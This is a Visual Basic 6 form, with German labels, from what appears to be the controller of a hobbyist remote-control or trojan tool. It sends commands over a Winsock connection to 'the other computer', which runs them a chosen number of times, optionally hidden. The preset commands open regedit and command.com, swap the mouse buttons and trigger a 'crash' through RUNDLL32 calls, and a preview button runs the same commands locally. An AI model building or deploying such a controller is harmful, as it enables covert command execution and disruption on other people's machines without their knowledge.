VERSION 5.00
Begin VB.Form Form4 
   Caption         =   "Befehle Senden....."
   ClientHeight    =   4965
   ClientLeft      =   60
   ClientTop       =   630
   ClientWidth     =   5685
   Icon            =   "befehler.frx":0000
   LinkTopic       =   "Form4"
   ScaleHeight     =   4965
   ScaleWidth      =   5685
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Frame Frame3 
      Height          =   1455
      Left            =   120
      TabIndex        =   15
      Top             =   2400
      Width           =   5535
      Begin VB.OptionButton Option18 
         Caption         =   "Öffnen mit"
         Height          =   255
         Left            =   1800
         TabIndex        =   27
         Top             =   960
         Width           =   1335
      End
      Begin VB.OptionButton Option17 
         Caption         =   "Systemsteuerung "
         Height          =   255
         Left            =   120
         TabIndex        =   26
         Top             =   960
         Width           =   1695
      End
      Begin VB.OptionButton Option16 
         Caption         =   "Diskette Kopieren"
         Height          =   255
         Left            =   3120
         TabIndex        =   25
         Top             =   960
         Width           =   2175
      End
      Begin VB.OptionButton Option15 
         Caption         =   "DFÜ verbindung anzeigen !!"
         Height          =   255
         Left            =   3120
         TabIndex        =   24
         Top             =   720
         Width           =   2295
      End
      Begin VB.OptionButton Option14 
         Caption         =   "Manuell sachen installieren"
         Height          =   255
         Left            =   3120
         TabIndex        =   23
         Top             =   480
         Width           =   2295
      End
      Begin VB.OptionButton Option13 
         Caption         =   "Maustasten tauschen"
         Height          =   255
         Left            =   3120
         TabIndex        =   22
         Top             =   240
         Width           =   1935
      End
      Begin VB.OptionButton Option12 
         Caption         =   "Absturz ??"
         Height          =   255
         Left            =   1800
         TabIndex        =   21
         Top             =   720
         Width           =   1455
      End
      Begin VB.OptionButton Option11 
         Caption         =   "InfoBox "
         Height          =   255
         Left            =   1800
         TabIndex        =   20
         Top             =   480
         Width           =   1575
      End
      Begin VB.OptionButton Option10 
         Caption         =   "Command"
         Height          =   255
         Left            =   1800
         TabIndex        =   19
         Top             =   240
         Width           =   1815
      End
      Begin VB.OptionButton Option9 
         Caption         =   "Regedit"
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   720
         Width           =   1695
      End
      Begin VB.OptionButton Option8 
         Caption         =   "Taschenrechner"
         Height          =   195
         Left            =   120
         TabIndex        =   17
         Top             =   480
         Width           =   1575
      End
      Begin VB.OptionButton Option7 
         Caption         =   "Notepad"
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   240
         Width           =   1695
      End
   End
   Begin VB.Frame Frame2 
      Height          =   1215
      Left            =   120
      TabIndex        =   10
      Top             =   0
      Width           =   5535
      Begin VB.TextBox Befehl 
         Height          =   285
         Left            =   1200
         TabIndex        =   12
         ToolTipText     =   "Hier einen Befehl ausführen"
         Top             =   360
         Width           =   3735
      End
      Begin VB.TextBox anzahl 
         Height          =   285
         Left            =   1200
         TabIndex        =   11
         Text            =   "1"
         ToolTipText     =   "Hier einfach eintragen wie oft eine Anwendung gestartet werden soll"
         Top             =   720
         Width           =   1695
      End
      Begin VB.Timer Timer1 
         Interval        =   10
         Left            =   2880
         Top             =   720
      End
      Begin VB.Label Label1 
         Alignment       =   2  'Zentriert
         BorderStyle     =   1  'Fest Einfach
         Caption         =   "Befehl"
         Height          =   285
         Left            =   120
         TabIndex        =   14
         Top             =   360
         Width           =   1095
      End
      Begin VB.Label Label2 
         Alignment       =   2  'Zentriert
         BorderStyle     =   1  'Fest Einfach
         Caption         =   "Anzahl"
         Height          =   285
         Left            =   120
         TabIndex        =   13
         Top             =   720
         Width           =   1335
      End
   End
   Begin VB.Frame Frame1 
      Height          =   1095
      Left            =   120
      TabIndex        =   3
      Top             =   1200
      Width           =   5535
      Begin VB.OptionButton Option1 
         Caption         =   "verstecken"
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Width           =   1695
      End
      Begin VB.OptionButton Option2 
         Caption         =   "Normal mit Focus"
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   480
         Value           =   -1  'True
         Width           =   2055
      End
      Begin VB.OptionButton Option3 
         Caption         =   "Minimiert mit Focus"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   720
         Width           =   2055
      End
      Begin VB.OptionButton Option4 
         Caption         =   "Maximiert mit Focus"
         Height          =   255
         Left            =   3120
         TabIndex        =   6
         Top             =   240
         Width           =   2055
      End
      Begin VB.OptionButton Option5 
         Caption         =   "Normal ohne Focus"
         Height          =   255
         Left            =   3120
         TabIndex        =   5
         Top             =   720
         Width           =   2055
      End
      Begin VB.OptionButton Option6 
         Caption         =   "Minimiert ohne Focus"
         Height          =   255
         Left            =   3120
         TabIndex        =   4
         Top             =   480
         Width           =   2055
      End
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Vorschau"
      Height          =   495
      Left            =   2520
      TabIndex        =   2
      ToolTipText     =   "Vorschau am eigenen Rechner"
      Top             =   4320
      Width           =   2295
   End
   Begin VB.TextBox ges 
      Height          =   285
      Left            =   1080
      TabIndex        =   1
      Top             =   3960
      Visible         =   0   'False
      Width           =   2895
   End
   Begin VB.CommandButton Senden 
      Caption         =   "&Senden"
      Height          =   495
      Left            =   240
      TabIndex        =   0
      ToolTipText     =   "Sendet die Einstellungen zum Andern Rechner"
      Top             =   4320
      Width           =   2295
   End
   Begin VB.Menu help 
      Caption         =   "Hilfe"
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim optionwert
Private Sub Command1_Click()
If Befehl.Text = "" Then
    MsgBox "Was soll den Ausgeführt werden ???", vbSystemModal + vbCritical + vbOKOnly, "FEHLER Fehlende Angabe"
    Exit Sub
End If
Dim ParameterWert As String
Dim Paras() As String
Dim i As Integer
Dim j As Integer
ParameterWert = ges.Text
'geht leider nicht'
'Paras = Split(ParameterWert, "|", -1, vbBinaryCompare)
' Anzahl Trennzeichen feststellen
j = 0
For i = 1 To Len(ParameterWert)
If Mid(ParameterWert, i, 1) = "|" Then
j = j + 1
End If
Next
' Array dimensionieren
ReDim Paras(0 To j)
' Parameter auslesen
j = 0
For i = 1 To Len(ParameterWert)
If Mid(ParameterWert, i, 1) = "|" Then
j = j + 1
Else
Paras(j) = Paras(j) & Mid(ParameterWert, i, 1)
End If
Next
For i = 1 To Paras(j - 2)
lala = Shell(Paras(j - 3), Paras(j - 1))
Next i
End Sub

Private Sub help_Click()
MsgBox "Bekannte Befehle:" & vbCrLf & "command.com" & vbCrLf & "Calc.exe" & vbCrLf & "notepad" & vbCrLf & "regedit", vbApplicationModal + vbOKOnly + vbInformation, "BEKANNTE BEFEHLE"
End Sub

Private Sub Option1_Click()
If Option1.Value = True Then
    optionwert = 0
End If
End Sub

Private Sub Option11_Click()
If Option11.Value = True Then
    Befehl.Text = "RUNDLL32.EXE shell32,ShellAboutA"
End If
End Sub

Private Sub Option12_Click()
If Option12.Value = True Then
    Befehl.Text = "RUNDLL32.EXE user, disableoemlayer"
End If
End Sub

Private Sub Option13_Click()
If Option13.Value = True Then
    Befehl.Text = "RUNDLL32.EXE user, swapmousebutton"
End If
End Sub

Private Sub Option14_Click()
If Option14.Value = True Then
    Befehl.Text = "RUNDLL32.EXE sysdm.cpl, InstallDevice_Rundll"
End If
End Sub

Private Sub Option15_Click()
If Option15.Value = True Then
    Befehl.Text = "RUNDLL32.EXE rnaui.dll,RnaDial (DFÜ Eintrag)"
End If
End Sub

Private Sub Option16_Click()
If Option16.Value = True Then
       Befehl.Text = "RUNDLL32.EXE diskcopy, DiskCopyRunDll"
End If
End Sub

Private Sub Option17_Click()
If Option17.Value = True Then
    Befehl.Text = "RUNDLL32.EXE shell32,Control_RunDLL"
End If
End Sub

Private Sub Option18_Click()
If Option18.Value = True Then
   Befehl.Text = "RUNDLL32.EXE shell32, OpenAs_RunDLL"
End If
End Sub

Private Sub Option2_Click()
If Option2.Value = True Then
    optionwert = 1
End If
End Sub

Private Sub Option3_Click()
If Option3.Value = True Then
    optionwert = vbMinimizedFocus
End If
End Sub

Private Sub Option4_Click()
If Option4.Value = True Then
    optionwert = vbMaximizedFocus
End If
End Sub

Private Sub Option5_Click()
If Option5.Value = True Then
    optionwert = vbNormalNoFocus
End If
End Sub

Private Sub Option6_Click()
If Option6.Value = True Then
    optionwert = vbMinimizedNoFocus
End If
End Sub

Private Sub Option7_Click()
If Option7.Value = True Then
    Befehl.Text = "notepad"
End If
End Sub

Private Sub Option8_Click()
If Option8.Value = True Then
    Befehl.Text = "calc"
End If
End Sub

Private Sub Option9_Click()
If Option9.Value = True Then
    Befehl.Text = "regedit"
End If
End Sub

Private Sub Senden_Click()
If Befehl.Text = "" Then
    MsgBox "Was soll den Ausgeführt werden ???", vbSystemModal + vbCritical + vbOKOnly, "FEHLER Fehlende Angabe"
    Exit Sub
End If
Form1.W.SendData ges.Text
Form4.Hide
Form1.Show
End Sub

Private Sub Timer1_Timer()
ges.Text = Befehl.Text & "|" & anzahl.Text & "|" & optionwert & "|" & "Befehl"
End Sub
